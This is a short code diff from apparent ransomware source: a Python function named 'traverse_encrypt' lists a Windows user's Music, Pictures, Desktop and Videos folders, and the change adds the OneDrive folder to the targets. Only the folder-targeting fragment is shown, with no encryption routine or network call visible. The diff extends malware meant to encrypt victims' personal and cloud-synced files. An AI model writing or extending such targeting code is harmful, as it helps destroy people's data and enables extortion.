@@ -199,7 +199,8 @@ def traverse_encrypt(drive, key):
             os.path.join(drive, f"Users\\{username}\\Music"),
             os.path.join(drive, f"Users\\{username}\\Pictures"),
             os.path.join(drive, f"Users\\{username}\\Desktop"),
-            os.path.join(drive, f"Users\\{username}\\Videos")
+            os.path.join(drive, f"Users\\{username}\\Videos"),
+            os.path.join(drive, f"Users\\{username}\\OneDrive")
         ]
         return main_dirs
         
